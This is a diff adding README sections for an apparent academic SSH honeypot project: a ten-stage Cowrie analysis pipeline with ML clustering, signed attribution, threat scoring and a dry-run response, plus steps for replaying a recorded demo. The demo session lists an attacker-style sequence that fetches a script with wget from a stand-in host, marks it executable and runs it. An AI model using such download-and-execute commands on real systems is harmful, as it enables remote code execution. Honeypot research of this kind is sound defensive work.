@@ -28,6 +28,8 @@
 - [Problem Statement](#-problem-statement)
 - [Motivation](#-motivation)
 - [System Architecture](#-system-architecture)
+- [Ten-Stage Pipeline (Implemented)](#-ten-stage-pipeline-implemented)
+- [Running the Demonstration](#-running-the-demonstration)
 - [Tech Stack](#-tech-stack)
 - [Repository Structure](#-repository-structure)
 - [Implementation — Phase 1](#-implementation--phase-1)
@@ -149,6 +151,127 @@ Internet / External Attackers
 | `/api/analyze` | `POST` | Trigger the ML analysis pipeline on new data |
 | `/api/rules` | `GET` | Export generated detection rules (Snort/Suricata format) |
 | `/api/sessions` | `GET` | Retrieve reconstructed attack session summaries |
+
+> ℹ️ The diagram above is the original platform vision. The pipeline as implemented and demonstrated today is described in **[Ten-Stage Pipeline (Implemented)](#-ten-stage-pipeline-implemented)** below.
+
+---
+
+## 🔬 Ten-Stage Pipeline (Implemented)
+
+Every Cowrie session flows through **ten stages in two independent branches**. Both branches start from the same captured events. The **ML branch** produces behavioural model outputs; the **rules branch** makes explainable, auditable threat decisions and runs a **dry-run** response. By design, DEC and novelty results are annotations and **do not feed threat scoring**.
+
+```
+                    ┌──────────────────────────────┐
+                    │  1  Cowrie honeypot          │  SSH sessions via the attributing relay
+                    └──────────────┬───────────────┘
+                    ┌──────────────▼───────────────┐
+                    │  2  Log collection           │  only lines appended after a baseline
+                    └──────┬────────────────┬──────┘
+          ML branch        │                │        Rules branch
+   ┌───────────────────────▼──┐          ┌──▼────────────────────────────┐
+   │ 3  Session reconstruction│          │ 9a Behavioural evidence       │
+   │ 4  Feature extraction    │          │ 9b Signed attribution         │
+   │ 5  DEC clustering        │          │ 9c Threat scoring & rules     │
+   │ 6  Pattern analysis      │          │ 10 Dynamic response (dry-run) │
+   │ 7  Signature generation  │          │    & feedback                 │
+   │ 8  Novelty assessment    │          │                               │
+   └──────────────────────────┘          └───────────────────────────────┘
+        model outputs            no data flow            decisions
+```
+
+| # | Stage | Implementation | What it produces |
+|:---:|---|---|---|
+| 1 | **Cowrie honeypot** | `cowrie-project` container (pinned image); `cowrie-ssh-relay` forwards SSH and writes Ed25519-signed, hash-chained relay records | `cowrie.json` events; relay records proving which client owned each session |
+| 2 | **Log collection** | line-boundary slice of the Cowrie log passed with `pipeline.py --raw-input` (avoids copying historical traffic) | the new session's raw events only |
+| 3 | **Session reconstruction** | [`parse_logs.py`](scripts/parse_logs.py) | `sessions.json`, `session_details.json` (commands, login, duration) |
+| 4 | **Feature extraction** | [`extract_features.py`](scripts/extract_features.py) (V1) | `behavior_features.csv` — 29 columns, 17 used by DEC |
+| 5 | **DEC clustering** | [`run_dec_evaluation.py`](ml/cowrie_dec_integration_skeleton/scripts/run_dec_evaluation.py) with the saved DEC model (17 → 4 latent dims, 3 clusters; no refit) | `dec_results.csv` — cluster and confidence |
+| 6 | **Pattern analysis** | [`behaviour_pattern_analysis.py`](scripts/behaviour_pattern_analysis.py) on the baseline corpus | cluster summaries, feature statistics, command analysis, behaviour profiles |
+| 7 | **Signature generation** | [`behaviour_signature_generation.py`](scripts/behaviour_signature_generation.py) | `behaviour_signatures.json` |
+| 8 | **Novelty assessment** | [`novelty_assessment.py`](scripts/novelty_assessment.py) | Known-like / Potentially Novel / Ambiguous / Insufficient Evidence, with score |
+| 9 | **Threat scoring & rules** | [`behavioural_evidence/`](behavioural_evidence/) → [`client_attribution/`](client_attribution/) (signed attribution) → [`threat_assessment/`](threat_assessment/) in an isolated container (`network_mode: none`) | evidence level, findings with severity S0–S3, eight proposal gates, tier (abstain / record / review / propose) |
+| 10 | **Dynamic response & feedback** | [`dynamic_response/`](dynamic_response/) — **dry-run only**; the enforcement interface is disabled | proposal → signed human approval → simulated restriction → operator verification → simulated rollback → feedback, all in a hash-chained audit log |
+
+### Safety properties
+
+| Property | How it is enforced |
+|---|---|
+| Only a verified client can be targeted | the attribution result must be signed and verify against a pinned key; gate 5 requires an attributable source |
+| No innocent address can be restricted | single allowlisted target (`10.250.25.3/32`, the lab test client); the control client, relay and internal networks are refused ([`configs/address_safety_v1.json`](configs/address_safety_v1.json)) |
+| Keys never share a role | relay, attribution-result and approver keys must all differ (key-role separation) |
+| Human in the loop | every response needs a signed approval bound to the exact proposal hash; TTL ≤ 900 s; replays refused |
+| Nothing is actually blocked | dry-run only; `DisabledRelayEnforcement` raises on every call; `ACTUAL_BLOCKING: NOT_EXECUTED` |
+| Demo sessions never pollute datasets | [`configs/session_exclusions_v2.json`](configs/session_exclusions_v2.json) excludes all diagnostic and demo sessions from dataset building and evaluation |
+
+### Demonstrated result (session `42ee73a7cbbd`, 12 Nov 2026)
+
+One controlled SSH session from the lab test client (`uname -a`, `wget http://files.example/x.sh -O x.sh`, `chmod +x x.sh`, `./x.sh`) was carried through all ten stages:
+
+| Branch | Stage | Result |
+|---|---|---|
+| shared | 1–2 | 14 events, login success `demo`, 10.5 s; only lines after the 21,888-line baseline |
+| ML | 3–5 | 1 session, 29-column feature row; DEC cluster 1, confidence 0.924 |
+| ML | 6–8 | baseline signature `sig-4e22763125d03876`; novelty **Known-like**, score 0.774 (threshold 0.70) |
+| Rules | 9 | evidence E2 (XFER-1 + EXEC-1); login and client `10.250.25.3` verified via DEMO-signed attribution; 8/8 gates pass → tier **propose** |
+| Rules | 10 | approval verified, **simulated** restriction, operator verification, **simulated** rollback → `rolled_back`; feedback recorded |
+
+Full evidence, hashes and the technical record: [`reports/academic_demo_readiness_20261112/`](reports/academic_demo_readiness_20261112/) (`report.md`, `DEMO_GUIDE.md`).
+
+---
+
+## ▶️ Running the Demonstration
+
+The demonstration replays the **saved, hash-verified evidence** of session `42ee73a7cbbd`. It needs **no Docker containers**, creates **no network traffic** and blocks nothing. Before displaying anything, the script re-verifies every manifest, signature and audit chain (28 checks).
+
+> ⚠️ **Use the project interpreter** `.venv\Scripts\python.exe`. A plain `python` may be the global install, which lacks `cryptography` and the project packages. Alternatively, activate the venv first: `.\.venv\Scripts\Activate.ps1`.
+
+### 1 — Verify the evidence (before presenting)
+
+```powershell
+cd C:\AMRITA\Final_Year_Project_zero_day_27\adaptive-zero-day-honeypot
+.\.venv\Scripts\python.exe reports\academic_demo_readiness_20261112\demo_presentation.py --verify
+```
+
+The output must end with `28/28 checks passed`.
+
+### 2 — Present the ten stages
+
+```powershell
+.\.venv\Scripts\python.exe reports\academic_demo_readiness_20261112\demo_presentation.py
+```
+
+Widen the terminal to at least 120 columns. The output has five labelled sections:
+
+| Section | Shows | Label |
+|---|---|---|
+| A — Cowrie interaction | session ID, login, commands, duration | `[OBSERVED]` |
+| B — Behavioural analysis | feature count, DEC cluster and confidence, baseline signature, novelty | `[MODEL]` |
+| C — Threat scoring | evidence level, indicators, login evidence, verified attribution, gates, tier | `[DECISION]` |
+| D — Dynamic response | proposal integrity, refused and accepted approvals, target and action, dry-run, verification, rollback | `[SIMULATED]` |
+| E — Feedback | feedback record, audit verification, final state | `[SIMULATED]` |
+
+The last line is always `ACTUAL_BLOCKING: NOT_EXECUTED`. The expected output is saved in [`demo_transcript_29f.txt`](reports/academic_demo_readiness_20261112/demo_transcript_29f.txt).
+
+### 3 — (Optional) Re-run the whole pipeline on synthetic data
+
+```powershell
+.\.venv\Scripts\python.exe reports\academic_demo_readiness_20261112\demo_orchestrator.py rehearse
+```
+
+This runs all ten stages on a **synthetic** session with temporary in-memory DEMO keys, uses the isolated `threat-assessment` container (requires Docker Desktop), performs a dry-run response and ends with `35/35 checks passed` (about 90 s). It writes a new folder under `rehearsal/` and creates no network session.
+
+### Troubleshooting
+
+| Symptom | Fix |
+|---|---|
+| `ENVIRONMENT ERROR: No module named 'cryptography'` | run with `.\.venv\Scripts\python.exe` |
+| `VERIFICATION FAILED` | do not present live output; show `demo_transcript_29f.txt` and check manifests with `sha256sum -c SHA256SUMS` |
+| Wrapped or garbled output | widen the terminal, or open the transcript in an editor |
+| Docker not running | not needed for steps 1–2 |
+
+> 🚫 Do **not** run `demo_orchestrator.py live` — it generates a real honeypot session and needs separate approval. Live attribution keys, the checkpoint witness and real enforcement are **not provisioned**; the demonstration uses clearly labelled temporary DEMO keys.
+
+The presenter guide, with limitations to disclose, is in [`DEMO_GUIDE.md`](reports/academic_demo_readiness_20261112/DEMO_GUIDE.md).
 
 ---
 
